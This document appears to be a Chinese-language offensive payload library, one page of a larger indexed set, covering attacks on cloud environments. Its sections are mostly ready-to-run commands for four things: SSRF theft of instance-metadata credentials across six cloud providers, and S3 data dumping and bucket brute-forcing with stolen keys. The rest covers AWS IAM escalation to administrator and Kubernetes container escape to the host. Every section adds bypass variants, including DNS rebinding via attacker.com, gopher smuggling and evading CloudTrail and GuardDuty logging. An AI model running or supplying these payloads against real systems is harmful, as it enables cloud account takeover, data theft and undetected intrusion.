# 云元数据 / IAM / K8s / S3 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:6 大云平台元数据攻击(AWS/GCP/Azure/阿里云/腾讯云/华为云) + AK/SK 格式识别 + 凭据利用决策树 + S3/OSS 配置错误 + AWS IAM 提权链 + K8s 容器逃逸。SSRF 入口拿到后云资产价值最高的一步。

---


### 云SSRF窃取元数据凭据  `cloud-ssrf-metadata`
利用SSRF漏洞访问云服务(AWS/GCP/Azure)的实例元数据服务(IMDS)获取临时IAM凭据。攻击者可通过获取的Access Key接管云资源，实现从Web漏洞到云环境的横向升级。
子类：**IMDS攻击** · tags: `云安全` `SSRF` `AWS` `GCP` `Azure` `IMDS` `元数据`

**前置条件：** 目标运行在云环境；存在SSRF漏洞；实例绑定了IAM角色

**攻击链：**

**1. 1. AWS元数据服务探测**
_通过SSRF访问AWS EC2实例元数据服务获取IAM临时凭据_
```
# IMDSv1——无需特殊Header
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# 获取IAM角色名
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取临时凭据
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# 获取用户数据(可能包含启动脚本中的密钥)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```

**2. 2. GCP/Azure元数据利用**
_获取GCP和Azure云环境的元数据凭据和管理令牌_
```
# GCP元数据——需要Metadata-Flavor头
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP获取项目信息
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure管理令牌
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**3. 3. 国内云元数据利用（阿里云/腾讯云/华为云）**
_获取国内三大云平台实例元数据和临时凭据_
```
# === 阿里云 (Alibaba Cloud) ===
# IMDS 端点: 100.100.100.200（仅实例内部可达）
curl -s "https://{TARGET}/fetch?url=http://100.100.100.200/latest/meta-data/"
curl -s "https://{TARGET}/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"
curl -s "https://{TARGET}/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/{ROLE_NAME}"
# AK 格式: LTAI 开头（临时 AK 为 STS.LTAI 开头）
# OSS Bucket: ossutil64 / oss-browser

# === 腾讯云 (Tencent Cloud) ===
# IMDS 端点: metadata.tencentyun.com / 169.254.0.23
curl -s "https://{TARGET}/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"
curl -s "https://{TARGET}/fetch?url=http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/"
curl -s "https://{TARGET}/fetch?url=http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/{ROLE_NAME}"
# 备用端点: 169.254.0.23（部分老实例）
# AK 格式: AKID + 随机字符串（SecretKey 无固定格式）
# COS Bucket: coscli / cosbrowser

# === 华为云 (Huawei Cloud) ===
# IMDS 端点: 169.254.169.254（标准地址，但路径为 OpenStack 格式）
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/openstack/latest/meta_data.json"
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/openstack/latest/user_data"
# 华为云使用 OpenStack Keystone IAM 模型（Domain → Project → User）
# AK/SK 无固定格式特征，通过 openstack CLI / obsutil 操作
# OBS Bucket: obsutil
```

**4. 4. 云 AK/SK 格式识别与凭据利用决策树**
_根据窃取的 AK/SK 格式自动判断云平台并选择正确的利用工具_
```
# === 凭据格式识别表 ===
# AWS         AK: AKIA/ASIA 开头(20字符)  SK: 40字符
# 腾讯云       AK: AKID + 32字符           SK: 32字符
# 阿里云       AK: LTAI 开头(16-20字符)    SK: 30字符
# 华为云       AK: 无固定格式               SK: 无固定格式
# GCP          SA JSON: {"type":"service_account","project_id":...}
# Azure        AZ CLI: ~/.Azure/ 目录下 Token/证书缓存

# === 凭据利用决策树 ===
# 拿到 AK/SK → 判断平台 → 选工具
# ├─ AWS:    aws-cli / pacu / enumerate-iam / pmapper
# ├─ 腾讯云:  tccli (pip install tccli) / coscli
# ├─ 阿里云:  aliyun-cli / ossutil64
# ├─ 华为云:  openstack CLI / obsutil / REST API (X-Auth-Token)
# ├─ GCP:     gcloud auth activate-service-account --key-file=sa.json
# └─ Azure:   az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT_ID

# === 临时凭据 vs 长期凭据 ===
# ASIA 开头 → AWS STS 临时凭据（有 X-Amz-Security-Token，有效期 1-12h）
# AKIA 开头 → AWS 长期凭据（永久有效，直到手动作废）
# 腾讯云 AKIDz 开头 → 临时凭据 Token
# 阿里云 STS.LTAI → STS 临时凭据
```

**5. 5. 利用获取的凭据横向移动**
_使用窃取的云凭据通过AWS CLI枚举云资源和权限_
```
# 配置AWS CLI使用窃取的凭据
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# 枚举权限
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# 列举S3桶
aws s3 ls

# 枚举EC2实例
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```

**6. 6. 深度利用——S3数据泄露/权限提升**
_利用获取的云凭据导出S3数据、检查IAM提权可能性和提取密钥_
```
# S3桶数据下载
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# 检查是否可以提权
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# 检查Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```

**WAF/EDR 绕过变体：**

**1. 绕过SSRF的IMDS防护**
_通过IP变形、DNS重绑定和协议走私绕过SSRF对IMDS地址的过滤_
```
# IMDSv2需要PUT获取Token——尝试Header注入
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP变形
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS重绑定
http://169-254-169-254.attacker.com  # 解析到169.254.169.254

# 协议走私
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```

---

### S3存储桶配置错误利用  `cloud-s3-misconfig`
利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。
子类：**S3安全** · tags: `云安全` `S3` `AWS` `配置错误` `数据泄露`

**前置条件：** 已知目标S3桶名；AWS CLI或HTTP访问

**攻击链：**

**1. 1. S3桶名枚举**
_通过域名变体、DNS记录和前端代码发现目标S3存储桶_
```
# 基于域名猜测桶名
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME检查
dig +short CNAME {TARGET} | grep s3

# 从前端资源URL发现
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```

**2. 2. 权限枚举**
_测试S3桶的匿名列举、读取、写入权限和策略配置_
```
# 测试列举权限
aws s3 ls "s3://{BUCKET}" --no-sign-request

# 测试读取权限
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# 测试写入权限
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# 检查Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# 检查ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```

**3. 3. 敏感数据搜索**
_枚举桶中所有文件并定向搜索下载敏感文件_
```
# 递归列举所有文件
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# 搜索敏感文件
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# 下载关键文件
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# 搜索备份数据库
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```

**4. 4. 验证利用（静态网站篡改/XSS）**
_测试S3网站桶的写入权限并验证是否可托管自定义HTML(可导致XSS/篡改)_
```
# 如果桶托管了静态网站且可写
# 检查是否为网站桶
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# 上传XSS测试页面(无害)
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# 验证是否可访问
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# 清理测试文件
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```

**WAF/EDR 绕过变体：**

**1. 绕过S3访问限制**
_通过区域端点变换、路径格式和已认证用户组绕过S3访问限制_
```
# 使用不同区域端点
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# 使用路径格式(可能绕过某些WAF)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# 使用已认证但不同账号的AWS凭据
# (某些桶策略允许"AuthenticatedUsers"组)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Signed URL泄露搜索
# 在Google/GitHub搜索: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```

---

### AWS IAM权限提升  `cloud-iam-escalation`
在已获取低权限AWS凭据后，利用IAM策略中的过度授权(如iam:PassRole、lambda:CreateFunction等)实现权限提升至管理员。涵盖20+种已知的AWS IAM提权路径。
子类：**IAM提权** · tags: `云安全` `AWS` `IAM` `权限提升` `Privilege Escalation`

**前置条件：** 已获取AWS凭据；IAM策略存在过度授权

**攻击链：**

**1. 1. 枚举当前权限**
_枚举当前IAM身份的所有权限和策略_
```
# 基础身份信息
aws sts get-caller-identity

# 枚举当前用户的策略
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# 获取策略详情
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# 使用enumerate-iam工具自动化
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```

**2. 2. iam:PassRole + Lambda提权**
_利用iam:PassRole和lambda:CreateFunction创建使用高权限角色的Lambda函数实现提权_
```
# 创建恶意Lambda函数(需要iam:PassRole + lambda:CreateFunction)

# 创建Lambda代码
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # 为当前用户附加管理员策略
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# 创建Lambda并关联高权限角色
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# 触发执行
aws lambda invoke --function-name security-test /tmp/output.json
```

**3. 3. 其他提权路径**
_展示多条IAM提权路径：策略版本覆盖、密钥创建和角色信任策略修改_
```
# 路径1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 路径2: iam:CreateAccessKey (为其他用户创建密钥)
aws iam create-access-key --user-name admin

# 路径3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```

**4. 4. 自动化提权工具**
_使用PACU、pmapper和cloudfox自动化发现和利用IAM提权路径_
```
# PACU——AWS渗透测试框架
python3 pacu.py
# 在PACU中:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper——IAM策略可视化和提权路径分析
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox枚举
cloudfox aws --profile target all-checks
```

**WAF/EDR 绕过变体：**

**1. 绕过CloudTrail和GuardDuty检测**
_通过使用非标准区域、低速操作和会话令牌降低被检测的风险_
```
# 使用非标准区域(可能未开启CloudTrail)
aws iam list-users --region af-south-1

# 低速操作避免触发异常检测
sleep $((RANDOM % 60 + 30))  # 30-90秒随机延迟

# 使用AWS服务间调用减少直接API日志
# 通过Lambda/SSM间接执行而非直接CLI调用

# 使用Session Token而非长期凭据
aws sts get-session-token --duration-seconds 3600
```

---

### Kubernetes容器逃逸  `cloud-k8s-escape`
在已获取Kubernetes Pod Shell的前提下，利用配置错误(特权容器、挂载宿主机路径、ServiceAccount高权限)实现容器逃逸，进而控制宿主机或整个Kubernetes集群。
子类：**容器安全** · tags: `云安全` `Kubernetes` `容器逃逸` `Docker` `特权容器`

**前置条件：** 已获取Pod内Shell；Pod存在配置错误

**攻击链：**

**1. 1. 容器环境侦察**
_确认容器环境并检查特权模式、SA令牌和内核能力_
```
# 确认在容器中
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# 检查ServiceAccount令牌
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查特权模式
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```

**2. 2. 特权容器逃逸**
_利用特权容器的磁盘挂载和cgroup release_agent实现宿主机命令执行_
```
# 方法1：挂载宿主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法2：通过cgroup逃逸(CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

**3. 3. 利用ServiceAccount接管集群**
_利用Pod中的ServiceAccount令牌通过K8s API枚举权限和获取集群Secrets_
```
# 读取SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 枚举权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# 列出所有Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# 列出Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```

**4. 4. 创建特权Pod反弹Shell**
_创建挂载宿主机根目录的特权Pod实现容器逃逸_
```
# 如果SA有create pods权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```

**WAF/EDR 绕过变体：**

**1. 绕过PodSecurityPolicy/OPA**
_通过切换命名空间、使用临时容器和CronJob绕过Pod安全策略_
```
# 使用非default命名空间(可能未应用PSP)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# 使用ephemeral容器(可能绕过PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# 使用CronJob而非Pod(某些策略不覆盖)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`10-ssrf-core.md`](10-ssrf-core.md)(SSRF 入口探测)
